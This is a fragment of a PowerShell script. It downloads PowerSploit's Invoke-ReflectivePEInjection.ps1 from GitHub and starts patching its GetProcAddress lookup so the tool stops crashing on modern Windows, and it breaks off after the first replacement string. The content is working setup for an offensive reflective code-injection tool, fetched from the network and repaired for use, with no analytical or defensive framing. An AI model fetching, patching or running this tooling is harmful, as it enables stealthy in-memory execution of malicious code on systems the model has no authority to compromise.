$RawScript = (Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1").Content

# 2. Patch the exact lines causing the "Ambiguous Match" crash on modern Windows
$OldCode = "`$GetProcAddress = `$UnsafeNativeMethods.GetMethod('GetProcAddress')"
